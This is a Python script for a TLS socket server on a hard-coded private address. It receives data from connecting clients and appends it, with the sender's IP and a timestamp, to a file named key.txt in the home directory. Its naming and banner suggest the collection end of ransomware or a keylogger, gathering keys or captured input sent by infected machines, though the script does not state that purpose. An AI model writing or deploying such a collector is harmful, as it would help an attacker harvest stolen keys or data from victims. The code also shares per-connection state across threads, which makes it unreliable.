import datetime
import threading
import base64
import socket, ssl
from os import system
from termcolor import colored
from os.path import expanduser

system('clear')
ascii_art = \
"""
 ^
 |
 |
 |
o+o
 0
"""

class SerVer() : 

    def listener(self) : 

        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERTIFICATE, keyfile=KEYFILE)

        try :
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
            print(colored(ascii_art,'red'))
            print(colored(f'Listen on {IP}:{PORT}','green'))
            sock.bind((IP,PORT))
            sock.listen(100)
            ssock = context.wrap_socket(sock, server_side=True)
            while 1:
                self.conn, self.addr = ssock.accept()
                print('Connexion from ',self.addr)
                self.data = self.conn.recv(2048).decode()
                print(self.data)

                th = threading.Thread(target=self.write_key,daemon=True)
                th.start()
                
        except KeyboardInterrupt : 
            print('\n')
        except Exception as e :
            print(e)
            

    def write_key(self) : 
        try : 
            tday = datetime.datetime.today().strftime("%Y-%m-%d %H:%M:%S")
            with open(expanduser('~/key.txt'),'a') as f : 

                f.write(f'Connexion from : {self.addr[0]} , at : {tday} , {self.data}')
                f.write('\n')
        except Exception as e :
            print(e)


if __name__ == '__main__' : 

    IP = '192.168.159.18'
    PORT = 5656
    CERTIFICATE = 'certfile.crt'
    KEYFILE = 'keyfile.key'
    
    srv = SerVer()
    srv.listener()


